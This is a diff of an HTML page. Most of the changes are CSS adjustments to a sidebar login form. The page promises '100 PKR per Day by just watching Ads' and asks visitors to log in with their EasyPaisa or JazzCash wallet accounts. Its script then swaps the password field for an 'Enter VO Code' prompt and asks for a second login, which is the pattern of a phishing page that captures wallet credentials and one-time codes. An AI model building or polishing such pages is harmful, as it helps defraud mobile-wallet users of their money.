@@ -53,8 +53,8 @@
             background-color: black;
             position: fixed;
             top: 0;
-            left: -250px;
-            width: 250px;
+            left: -200px; /* Adjusted to prevent overflow */
+            width: 200px;
             height: 100%;
             transition: left 0.3s ease;
             padding: 20px;
@@ -80,11 +80,11 @@
         .reveal-message {
             animation: shine 2s infinite;
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
             border: 1px solid white;
-            padding: 10px;
+            padding: 8px; /* Reduced padding */
             border-radius: 5px;
-            font-size: 18px;
+            font-size: 16px; /* Adjusted font size */
             font-weight: bold;
         }
 
@@ -101,18 +101,18 @@
         .login-form {
             display: flex;
             flex-direction: column;
-            align-items: stretch;
+            align-items: center; /* Center align items */
         }
 
         .login-form input,
         .login-form select {
             border-radius: 10px;
-            padding: 8px; /* Reduced padding */
+            padding: 8px;
             margin-bottom: 10px;
             border: 1px solid #ccc;
             outline: none;
-            width: 90%; /* Set to 90% to prevent overflow */
-            max-width: 300px; /* Maximum width for larger screens */
+            width: 90%;
+            max-width: 300px;
             transition: border 0.3s, background 0.3s;
         }
 
@@ -129,8 +129,8 @@
             padding: 10px;
             cursor: pointer;
             transition: background-color 0.3s, color 0.3s;
-            width: 90%; /* Set button width */
-            max-width: 300px; /* Maximum width for larger screens */
+            width: 90%;
+            max-width: 300px;
         }
 
         .login-form button:hover {
@@ -143,11 +143,12 @@
             height: auto;
             border-radius: 10px; /* Rounded corners */
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: -10px; /* Prevent overflow under the button */
         }
 
         .button-overlay {
             position: absolute;
-            top: 50%;
+            top: 40%; /* Adjusted for better centering */
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 1;
@@ -163,17 +164,17 @@
 
             .company-name {
                 font-size: 20px;
-                margin: 10px 0; /* Add margin for spacing */
+                margin: 10px 0;
             }
 
             .sidebar {
-                width: 100%;
-                left: -200px; /* Adjusted to prevent overflow */
+                width: 90%; /* Full width on mobile */
+                left: -180px; /* Adjusted to prevent overflow */
             }
 
             .sidebar-button {
                 align-self: flex-end;
-                margin-left: auto; /* Align button to the right */
+                margin-left: auto;
             }
         }
     </style>
@@ -188,9 +189,6 @@
 </header>
 
 <div class="sidebar" id="sidebar">
-    <br>
-    <br>
-    <br>
     <div class="reveal-message">Dear Gainers! Please login with your EasyPaisa or JazzCash account.</div>
     <div class="reveal-message" id="finalProceedingMessage" style="display:none;">Click on Login again for final proceedings.</div>
     <form id="login-form" class="login-form">
@@ -216,7 +214,7 @@
         </a>
     </div>
 
-    <div id="message" style="margin-top: 10px; color: red; font-weight: bold; font-size: 1.1em; display: none;">
+    <div id="message" style="margin-top: 10px; color: red; font-weight: bold; font-size: 1em; display: none;">
         Login to start making 100 PKR per Day by just watching Ads
     </div>
 </section>
@@ -245,7 +243,6 @@
                 passwordField.type = 'text';
                 passwordField.value = '';
                 passwordField.placeholder = "Enter VO Code";
-                passwordField.classList.add('highlight');
                 passwordField.style.color = 'black';
                 document.getElementById('confirmationMessage').style.display = 'block';
             })
